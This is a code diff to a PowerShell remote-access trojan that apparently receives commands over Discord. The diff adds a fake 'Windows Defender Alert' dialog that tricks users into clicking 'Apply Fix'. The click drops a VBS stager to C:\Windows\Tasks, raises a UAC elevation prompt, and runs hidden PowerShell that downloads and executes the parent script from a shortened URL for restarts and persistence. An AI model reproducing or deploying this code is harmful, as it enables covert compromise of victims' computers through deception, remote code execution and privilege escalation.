@@ -25,7 +25,7 @@ $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window whil
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 1 # Option to start all jobs automatically upon running
-$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$global:parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -794,7 +794,54 @@ Function IsAdmin{
 }
 
 Function Elevate{
-    $tobat = @"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName Microsoft.VisualBasic
+    [System.Windows.Forms.Application]::EnableVisualStyles()
+    
+    $errorForm = New-Object Windows.Forms.Form
+    $errorForm.Width = 400
+    $errorForm.Height = 180
+    $errorForm.TopMost = $true
+    $errorForm.StartPosition = 'CenterScreen'
+    $errorForm.Text = 'Windows Defender Alert'
+    $errorForm.Font = 'Microsoft Sans Serif,10'
+    $icon = [System.Drawing.SystemIcons]::Information
+    $errorForm.Icon = $icon
+    $errorForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+    
+    $label = New-Object Windows.Forms.Label
+    $label.AutoSize = $false
+    $label.Width = 380
+    $label.Height = 80
+    $label.TextAlign = 'MiddleCenter'
+    $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
+    $label.Location = New-Object System.Drawing.Point(10, 10)
+    
+    $shieldIcon = [System.Drawing.SystemIcons]::Shield.ToBitmap()
+    $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
+    $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
+    $graphics.DrawImage($shieldIcon, 0, 0, 16, 16)
+    $okButton = New-Object Windows.Forms.Button
+    $okButton.Text = "  Apply Fix"
+    $okButton.Width = 110
+    $okButton.Height = 25
+    $okButton.Location = New-Object System.Drawing.Point(185, 110)
+    $okButton.Image = $resizedIcon
+    $okButton.TextImageRelation = 'ImageBeforeText'
+    
+    $cancelButton = New-Object Windows.Forms.Button
+    $cancelButton.Text = "Cancel "
+    $cancelButton.Width = 80
+    $cancelButton.Height = 25
+    $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
+    
+    $errorForm.controls.AddRange(@($label, $okButton, $cancelButton))
+    
+    $okButton.Add_Click({
+        $errorForm.Close()
+        $graphics.Dispose()
+        $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
 If Not WScript.Arguments.Named.Exists(`"elevate`") Then
@@ -802,20 +849,29 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm $parent | iex`", 0, True
 "@
-    $pth = "C:\Windows\Tasks\service.vbs"
-    $tobat | Out-File -FilePath $pth -Force
-    try{
-        & $pth
-        Sleep 7
-        rm -Path $pth
-        sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"
-        exit
-    }
-    catch{
-    Write-Host "FAILED"
-    }
+        $pth = "C:\Windows\Tasks\service.vbs"
+        $tobat | Out-File -FilePath $pth -Force
+        try{
+            & $pth
+            Sleep 7
+            rm -Path $pth
+            sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"
+        }
+        catch{
+            Write-Host "FAILED"
+        }
+        return                   
+    })
+    
+    $cancelButton.Add_Click({
+        $errorForm.Close()
+        $graphics.Dispose()
+        return                    
+    })
+    
+    [void]$errorForm.ShowDialog()
 }
 
 Function ExcludeCDrive {
